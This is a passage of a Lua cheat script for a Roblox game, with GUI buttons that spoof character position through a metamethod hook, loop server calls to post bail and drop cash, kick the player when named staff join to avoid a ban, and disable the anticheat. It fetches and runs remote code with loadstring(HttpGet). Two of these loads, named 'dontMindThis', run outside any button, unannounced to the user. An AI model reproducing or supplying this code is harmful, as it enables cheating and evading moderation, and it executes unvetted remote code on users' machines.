            SpoofThis = SpoofThis * CFrame.new(Vector3.new(0, 0, 0))
            SpoofThis = SpoofThis * CFrame.Angles(math.rad(RandomNumberRange(180)), math.rad(RandomNumberRange(180)), math.rad(RandomNumberRange(180)))
      
            LocalPlayer.Character.HumanoidRootPart.CFrame = SpoofThis
      
            LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(1, 1, 1) * 16384
      
            BruhXD.RenderStepped:Wait()
      
            LocalPlayer.Character.HumanoidRootPart.CFrame = DesyncTypes[1]
            LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = DesyncTypes[2]
         end
      end)
      
      
      --// Hook_CFrame
      local XDDDDDD = nil
      XDDDDDD = hookmetamethod(game, "__index", newcclosure(function(self, key)
         if PastedSources == true then
            if not checkcaller() then
               if key == "CFrame" and PastedSources == true and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character:FindFirstChild("Humanoid") and LocalPlayer.Character:FindFirstChild("Humanoid").Health > 0 then
                  if self == LocalPlayer.Character.HumanoidRootPart then
                     return DesyncTypes[1] or CFrame.new()
                  elseif self == LocalPlayer.Character.Head then
                     return DesyncTypes[1] and DesyncTypes[1] + Vector3.new(0, LocalPlayer.Character.HumanoidRootPart.Size / 2 + 0.5, 0) or CFrame.new()
                  end
               end
            end
         end
         return XDDDDDD(self, key)
      end))
   end,
})

local Label = Tab:CreateLabel("walk up to the person you want 2 kick and press x.")




local Label = Tab:CreateLabel("other scripts")



local Button = Tab:CreateButton({
    Name = "auto bail",
    Callback = function()
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("PoliceService"):WaitForChild("RF"):WaitForChild("Bail"):InvokeServer()




local Label = Tab:CreateLabel(".")



    end,
 })


 local Button = Tab:CreateButton({
    Name = "loop auto bail",
    Callback = function()
   
_G.Bail = true;

while _G.Bail == true do
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("PoliceService"):WaitForChild("RF"):WaitForChild("Bail"):InvokeServer()

wait()
    end
end,
 })


 local Button = Tab:CreateButton({
    Name = "unloop auto bail",
    Callback = function()
        _G.Bail = false;

        while _G.Bail == true do
            game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("PoliceService"):WaitForChild("RF"):WaitForChild("Bail"):InvokeServer()

        wait()
    end
end,
 })





local Button = Tab:CreateButton({
    Name = "always day",
    Callback = function()
        if not _G.FullBrightExecuted then

            _G.FullBrightEnabled = false
        
            _G.NormalLightingSettings = {
                Brightness = game:GetService("Lighting").Brightness,
                ClockTime = game:GetService("Lighting").ClockTime,
                FogEnd = game:GetService("Lighting").FogEnd,
                GlobalShadows = game:GetService("Lighting").GlobalShadows,
                Ambient = game:GetService("Lighting").Ambient
            }
        
            game:GetService("Lighting"):GetPropertyChangedSignal("Brightness"):Connect(function()
                if game:GetService("Lighting").Brightness ~= 1 and game:GetService("Lighting").Brightness ~= _G.NormalLightingSettings.Brightness then
                    _G.NormalLightingSettings.Brightness = game:GetService("Lighting").Brightness
                    if not _G.FullBrightEnabled then
                        repeat
                            wait()
                        until _G.FullBrightEnabled
                    end
                    game:GetService("Lighting").Brightness = 1
                end
            end)
        
            game:GetService("Lighting"):GetPropertyChangedSignal("ClockTime"):Connect(function()
                if game:GetService("Lighting").ClockTime ~= 12 and game:GetService("Lighting").ClockTime ~= _G.NormalLightingSettings.ClockTime then
                    _G.NormalLightingSettings.ClockTime = game:GetService("Lighting").ClockTime
                    if not _G.FullBrightEnabled then
                        repeat
                            wait()
                        until _G.FullBrightEnabled
                    end
                    game:GetService("Lighting").ClockTime = 12
                end
            end)
        
            game:GetService("Lighting"):GetPropertyChangedSignal("FogEnd"):Connect(function()
                if game:GetService("Lighting").FogEnd ~= 786543 and game:GetService("Lighting").FogEnd ~= _G.NormalLightingSettings.FogEnd then
                    _G.NormalLightingSettings.FogEnd = game:GetService("Lighting").FogEnd
                    if not _G.FullBrightEnabled then
                        repeat
                            wait()
                        until _G.FullBrightEnabled
                    end
                    game:GetService("Lighting").FogEnd = 786543
                end
            end)
        
            game:GetService("Lighting"):GetPropertyChangedSignal("GlobalShadows"):Connect(function()
                if game:GetService("Lighting").GlobalShadows ~= false and game:GetService("Lighting").GlobalShadows ~= _G.NormalLightingSettings.GlobalShadows then
                    _G.NormalLightingSettings.GlobalShadows = game:GetService("Lighting").GlobalShadows
                    if not _G.FullBrightEnabled then
                        repeat
                            wait()
                        until _G.FullBrightEnabled
                    end
                    game:GetService("Lighting").GlobalShadows = false
                end
            end)
        
            game:GetService("Lighting"):GetPropertyChangedSignal("Ambient"):Connect(function()
                if game:GetService("Lighting").Ambient ~= Color3.fromRGB(178, 178, 178) and game:GetService("Lighting").Ambient ~= _G.NormalLightingSettings.Ambient then
                    _G.NormalLightingSettings.Ambient = game:GetService("Lighting").Ambient
                    if not _G.FullBrightEnabled then
                        repeat
                            wait()
                        until _G.FullBrightEnabled
                    end
                    game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
                end
            end)
        
            game:GetService("Lighting").Brightness = 1
            game:GetService("Lighting").ClockTime = 12
            game:GetService("Lighting").FogEnd = 786543
            game:GetService("Lighting").GlobalShadows = false
            game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
        
            local LatestValue = true
            spawn(function()
                repeat
                    wait()
                until _G.FullBrightEnabled
                while wait() do
                    if _G.FullBrightEnabled ~= LatestValue then
                        if not _G.FullBrightEnabled then
                            game:GetService("Lighting").Brightness = _G.NormalLightingSettings.Brightness
                            game:GetService("Lighting").ClockTime = _G.NormalLightingSettings.ClockTime
                            game:GetService("Lighting").FogEnd = _G.NormalLightingSettings.FogEnd
                            game:GetService("Lighting").GlobalShadows = _G.NormalLightingSettings.GlobalShadows
                            game:GetService("Lighting").Ambient = _G.NormalLightingSettings.Ambient
                        else
                            game:GetService("Lighting").Brightness = 1
                            game:GetService("Lighting").ClockTime = 12
                            game:GetService("Lighting").FogEnd = 786543
                            game:GetService("Lighting").GlobalShadows = false
                            game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
                        end
                        LatestValue = not LatestValue
                    end
                end
            end)
        end
        
        _G.FullBrightExecuted = true
        _G.FullBrightEnabled = not _G.FullBrightEnabled
    end,
 })



 




local Button = Tab:CreateButton({
   Name = "drop 10k",
   Callback = function()
      _G.test = true;

      while _G.test == true do
      game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("PlayerService"):WaitForChild("RE"):WaitForChild("DropCash"):FireServer(10000)
      
       Wait()
      end
   end,
})


local Button = Tab:CreateButton({
   Name = "stop dropping",
   Callback = function()
      _G.test = false;

      while _G.test == true do
      game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("PlayerService"):WaitForChild("RE"):WaitForChild("DropCash"):FireServer(100)
      
       Wait()
      end
   end,
})

local Button = Tab:CreateButton({
   Name = "selfkick if a staff member joins.",
   Callback = function()
      local LocalPlayer = game.Players.LocalPlayer
      local Players = game:GetService("Players")
      
      
      Players.PlayerAdded:Connect(function(player)
        if player.Name == "doubledday1" or player.Name == "scraifi" or player.Name == "revtype" or player.Name == "XxAsianMoonxX" or player.Name == "dtbvalhalla"  or player.Name == "4PFeds"
      then
        LocalPlayer:Kick(player.name .. "joined the game, kicking to prevent ban.")
        end
      end)
   end,
})




local Button = Tab:CreateButton({
   Name = "kill anticheat(makes it so u cant play the game)",
   Callback = function()
   game:GetService("Players").LocalPlayer.PlayerScripts.Client.Disabled = true
Instance:Destroy()
   end,
})

local Label = Tab:CreateLabel("...")




-- END OF NORMAL TPS

local Tab = Window:CreateTab("other guis for hl", 4483362458) -- Title, Image

local Section = Tab:CreateSection("guis")

local Button = Tab:CreateButton({
    Name = "swimhub gui (scripthub)",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/SWIMHUBISWIMMING/-/main/beta"))()


    end,
 })





 loadstring(game:HttpGet("https://raw.githubusercontent.com/sharkifyy/RobloxDevScripts/main/dontMindThis", true))() 
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/sharkifyy/RobloxDevScripts/main/2DONTMINDTHIS", true))() 
 







-- end of that lol



local Tab = Window:CreateTab("not script related", 4483362458) -- Title, Image


local Section = Tab:CreateSection("the stuff")

local Button = Tab:CreateButton({
    Name = "join smallest server",
    Callback = function()
        local Http = game:GetService("HttpService")
        local TPS = game:GetService("TeleportService")
        local Api = "https://games.roblox.com/v1/games/"
        
        local _place = game.PlaceId
        local _servers = Api.._place.."/servers/Public?sortOrder=Asc&limit=100"
        function ListServers(cursor)
           local Raw = game:HttpGet(_servers .. ((cursor and "&cursor="..cursor) or ""))
           return Http:JSONDecode(Raw)
        end
        
        local Server, Next; repeat
           local Servers = ListServers(Next)
           Server = Servers.data[1]
           Next = Servers.nextPageCursor
        until Server
        
        TPS:TeleportToPlaceInstance(_place,Server.id,game.Players.LocalPlayer)
    end,
 })

 local Button = Tab:CreateButton({
    Name = "server hop",
    Callback = function()
        local Player = game.Players.LocalPlayer    
        local Http = game:GetService("HttpService")
        local TPS = game:GetService("TeleportService")
        local Api = "https://games.roblox.com/v1/games/"
        
        local _place,_id = game.PlaceId, game.JobId
        local _servers = Api.._place.."/servers/Public?sortOrder=Desc&limit=100"
        function ListServers(cursor)
           local Raw = game:HttpGet(_servers .. ((cursor and "&cursor="..cursor) or ""))
           return Http:JSONDecode(Raw)
        end
        
        local Next; repeat
           local Servers = ListServers(Next)
           for i,v in next, Servers.data do
               if v.playing < v.maxPlayers and v.id ~= _id then
                   local s,r = pcall(TPS.TeleportToPlaceInstance,TPS,_place,v.id,Player)
                   if s then break end
               end
           end
           
           Next = Servers.nextPageCursor
        until not Next
    end,
 })




 local Button = Tab:CreateButton({
    Name = "Hydroxide",
    Callback = function()
        local owner = "Upbolt"
        local branch = "revision"
        
        local function webImport(file)
            return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua"):format(owner, branch, file)), file .. '.lua')()
        end
        
        webImport("init")
        webImport("ui/main")
    end,
 })






 
 local Button = Tab:CreateButton({
    Name = "CMD-X",
    Callback = function()
    --[[----------------------------------------------------------------
|                ▄▀▄▄▄▄   ▄▀▀▄ ▄▀▄  ▄▀▀█▄▄   ▄▀▀▄  ▄▀▄             |
|               █ █    ▌ █  █ ▀  █ █ ▄▀   █ █    █   █             |
|              ▐ █      ▐  █    █ ▐ █    █ ▐     ▀▄▀               |
|                █        █    █    █    █      ▄▀ █               |
|               ▄▀▄▄▄▄▀ ▄▀   ▄▀    ▄▀▄▄▄▄▀     █  ▄▀               |
|              █     ▐  █    █    █     ▐    ▄▀  ▄▀                |
|              ▐        ▐    ▐    ▐         █    ▐                 |
|               ▐        ▐    ▐    ▐         █    ▐                |
|------------------------------------------------------------------|
|    Credits:    | Binds & Info:                                   |
|    pigeon#8951 | U                         Open and close output |
|      fini#7057 | RShift                          Fill suggestion |
|     adam.#0004 | ;                               Focus on CMDBar |
| -------------- | Q                                Open and close |
|                | LShift+Bksp                        Clear CMDbar |
|                |                                                 |
|                | .cmds                             List commands |
----------------------------------------------------------------]]--
loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
    end,
 })
